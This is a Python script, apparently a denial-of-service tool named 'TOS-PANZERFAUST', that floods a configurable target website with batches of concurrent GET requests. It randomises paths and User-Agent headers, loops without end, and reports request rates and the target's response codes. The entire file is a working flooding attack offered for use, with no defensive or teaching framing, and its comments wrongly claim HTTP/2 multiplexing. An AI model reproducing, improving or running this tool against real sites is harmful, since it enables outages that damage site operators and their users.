import asyncio
import aiohttp
import random
import time
import signal
import sys

# ================= CONFIG =================
TARGET = "https://example.com"  # CHANGE THIS
CONNECTIONS = 7                 # HTTP/2 connections
STREAMS_PER_CONN = 100          # Concurrent streams per connection
# ==========================================

running = True
total_requests = 0
last_status = 200
start_time = time.time()

# Color codes
COLOR = {
    'reset': '\033[0m',
    'red': '\033[91m',
    'green': '\033[92m',
    'yellow': '\033[93m',
    'blue': '\033[94m',
    'magenta': '\033[95m',
    'cyan': '\033[96m'
}

# ================= RANDOM PATH GENERATOR =================
def random_path():
    """Generate random endpoint paths"""
    paths = [
        '/', '/api', '/v1', '/data', '/users', '/products',
        '/admin', '/login', '/register', '/search',
        f'/{random.randint(1000, 9999)}',
        f'/id/{random.randint(1, 1000000)}',
        f'/user/{random.randint(1, 10000)}',
        f'/item/{random.randint(1, 5000)}',
        f'/category/{random.choice(["a", "b", "c", "d"])}',
        f'/page/{random.randint(1, 100)}',
        f'/post/{random.randint(1, 500)}',
        f'/article/{random.randint(1, 200)}',
        f'/image/{random.randint(1, 999)}.jpg',
        f'/download/{random.randint(1, 99)}',
        '/static/css/style.css',
        '/static/js/app.js',
        '/robots.txt',
        '/sitemap.xml',
        '/feed',
        '/api/v2/users',
        '/api/v1/products',
        '/api/v3/data',
        f'/search?q={random.randint(1, 999999)}',
        f'/filter?type={random.choice(["new", "popular", "featured"])}',
        f'/sort?by={random.choice(["date", "name", "price"])}'
    ]
    return random.choice(paths)

# ================= HTTP/2 ATTACK =================
async def http2_connection(conn_id):
    """Single HTTP/2 connection with multiplexing"""
    global total_requests, last_status, running
    
    # Create HTTP/2 session
    try:
        timeout = aiohttp.ClientTimeout(total=30)
        connector = aiohttp.TCPConnector(
            limit=0,
            force_close=True,
            enable_cleanup_closed=True
        )
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout
        ) as session:
            
            # Main attack loop for this connection
            while running:
                # Create batch of requests
                tasks = []
                for _ in range(STREAMS_PER_CONN):
                    url = TARGET.rstrip('/') + random_path()
                    task = send_request(session, url)
                    tasks.append(task)
                
                # Send batch concurrently (HTTP/2 multiplexing)
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                # Process results
                for result in results:
                    if isinstance(result, int):
                        last_status = result
                        total_requests += 1
                    elif isinstance(result, aiohttp.ClientResponse):
                        last_status = result.status
                        total_requests += 1
                        result.close()
                
                # Small delay to prevent CPU overload
                await asyncio.sleep(0.01)
                
    except Exception as e:
        pass

async def send_request(session, url):
    """Send single HTTP/2 request"""
    try:
        async with session.get(
            url,
            headers={
                'User-Agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                ])
            },
            timeout=aiohttp.ClientTimeout(total=5)
        ) as response:
            return response
    except aiohttp.ClientError:
        return 0  # Network error
    except asyncio.TimeoutError:
        return 0  # Timeout
    except Exception:
        return 0  # Other error

# ================= LOGGING =================
async def log_status():
    """Log attack status every 10 seconds"""
    global start_time, last_status
    
    last_log_time = time.time()
    
    while running:
        current_time = time.time()
        if current_time - last_log_time >= 10:
            last_log_time = current_time
            
            # Calculate RPS
            elapsed = current_time - start_time
            rps = total_requests / elapsed if elapsed > 0 else 0
            
            # Format numbers
            formatted_reqs = f"{total_requests:,}"
            formatted_rps = f"{rps:,.0f}"
            
            # Status color
            if last_status == 0:
                status_color = COLOR['red']
                status_text = "ERR"
            elif 200 <= last_status < 300:
                status_color = COLOR['green']
                status_text = str(last_status)
            elif 300 <= last_status < 400:
                status_color = COLOR['yellow']
                status_text = str(last_status)
            else:
                status_color = COLOR['red']
                status_text = str(last_status)
            
            # Log output
            print(f"{COLOR['cyan']}TOS-PANZERFAUST{COLOR['reset']}:"
                  f"{COLOR['green']}{formatted_reqs}{COLOR['reset']} "
                  f"({formatted_rps}/s) ----> "
                  f"{status_color}{status_text}{COLOR['reset']}")
        
        await asyncio.sleep(1)

# ================= MAIN =================
async def main():
    global running
    
    print(f"{COLOR['magenta']}[TOS-PANZERFAUST] HTTP/2 MULTIPLEX ATTACK{COLOR['reset']}")
    print(f"{COLOR['yellow']}Target: {TARGET}{COLOR['reset']}")
    print(f"{COLOR['yellow']}Connections: {CONNECTIONS}{COLOR['reset']}")
    print(f"{COLOR['yellow']}Streams per connection: {STREAMS_PER_CONN}{COLOR['reset']}")
    print(f"{COLOR['yellow']}Total concurrent: {CONNECTIONS * STREAMS_PER_CONN:,}{COLOR['reset']}")
    print("-" * 60)
    
    # Start HTTP/2 connections
    connection_tasks = []
    for i in range(CONNECTIONS):
        task = asyncio.create_task(http2_connection(i))
        connection_tasks.append(task)
    
    # Start logging
    log_task = asyncio.create_task(log_status())
    
    # Wait for all tasks
    try:
        await asyncio.gather(*connection_tasks, log_task)
    except asyncio.CancelledError:
        pass

# ================= SIGNAL HANDLER =================
def signal_handler(sig, frame):
    global running
    print(f"\n{COLOR['red']}[!] Stopping attack...{COLOR['reset']}")
    running = False

# ================= ENTRY POINT =================
if __name__ == "__main__":
    # Setup signal handlers
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Check target
    if not TARGET.startswith(('http://', 'https://')):
        print(f"{COLOR['red']}[!] Target must start with http:// or https://{COLOR['reset']}")
        sys.exit(1)
    
    # Run attack
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{COLOR['red']}[!] Stopped by user{COLOR['reset']}")
    finally:
        # Final stats
        elapsed = time.time() - start_time
        rps = total_requests / elapsed if elapsed > 0 else 0
        
        print(f"\n{COLOR['magenta']}[STATISTICS]{COLOR['reset']}")
        print(f"{COLOR['green']}Total requests: {total_requests:,}{COLOR['reset']}")
        print(f"{COLOR['green']}Attack duration: {elapsed:.1f}s{COLOR['reset']}")
        print(f"{COLOR['green']}Average RPS: {rps:,.0f}{COLOR['reset']}")
        print(f"{COLOR['green']}Peak concurrent: {CONNECTIONS * STREAMS_PER_CONN:,}{COLOR['reset']}")
